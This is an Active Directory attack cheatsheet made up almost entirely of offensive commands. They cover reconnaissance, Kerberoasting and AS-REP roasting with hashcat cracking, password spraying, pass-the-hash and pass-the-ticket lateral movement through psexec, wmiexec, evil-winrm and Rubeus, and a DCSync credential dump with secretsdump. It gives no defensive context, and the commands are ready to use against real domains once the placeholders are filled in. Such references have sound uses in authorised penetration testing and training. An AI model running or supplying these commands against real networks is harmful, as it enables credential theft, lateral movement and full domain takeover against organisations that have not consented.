# Active Directory Cheatsheet

## Host / Domain Context

```powershell
whoami /all
hostname
ipconfig /all
nltest /dsgetdc:<domain>
systeminfo | findstr /B /C:"Domain" /C:"Logon Server"
```

## LDAP / SMB / Kerberos Recon

```bash
crackmapexec smb <dc> -u '' -p '' --shares
crackmapexec smb <targets> -u <user> -p <pass>
rpcclient -U "" -N <dc>
ldapsearch -x -H ldap://<dc> -D '<user>@<domain>' -w '<pass>' -b 'DC=corp,DC=local'
GetADUsers.py <domain>/<user>:<pass> -all
```

## Domain Enumeration

```powershell
Get-ADDomain
Get-ADForest
Get-ADUser -Filter * -Properties servicePrincipalName
Get-ADComputer -Filter *
Get-ADGroupMember "Domain Admins"
Get-ADTrust -Filter *
```

```bash
bloodhound-python -u <user> -p '<pass>' -d <domain> -c All -ns <dc_ip>
```

## Kerberoasting

```bash
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request
Rubeus kerberoast /outfile:hashes.txt
hashcat -m 13100 hashes.txt rockyou.txt
```

## AS-REP Roasting

```bash
GetNPUsers.py <domain>/ -dc-ip <dc_ip> -usersfile users.txt -no-pass
Rubeus asreproast /format:hashcat /outfile:asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

## Password Spraying

```bash
kerbrute userenum --dc <dc_ip> -d <domain> users.txt
kerbrute passwordspray --dc <dc_ip> -d <domain> users.txt 'Winter2025!'
crackmapexec smb <targets> -u users.txt -p 'Winter2025!'
```

## Pass-the-Hash / Ticket

```bash
crackmapexec smb <target> -u administrator -H <nthash>
psexec.py -hashes :<nthash> <domain>/administrator@<target>
wmiexec.py -hashes :<nthash> <domain>/administrator@<target>
evil-winrm -i <target> -u <user> -H <nthash>
```

```powershell
Rubeus ptt /ticket:ticket.kirbi
klist
```

## DCSync / Sensitive Rights

```bash
secretsdump.py <domain>/<user>:<pass>@<dc>
```

Look for:

- `Replicating Directory Changes`
- `Replicating Directory Changes All`
- `GenericAll`
- `WriteDacl`
- `WriteOwner`
- `ForceChangePassword`

## BloodHound Focus

Queries worth checking first:

- shortest path to `Domain Admins`
- kerberoastable users
- AS-REP roastable users
- high value target sessions
- outbound object control
- unconstrained / constrained delegation

## Quick File / Share Targets

```bash
crackmapexec smb <targets> --shares
smbclient -L //<host> -U '<domain>/<user>%<pass>'
smbmap -H <host> -u <user> -p '<pass>' -d <domain>
```
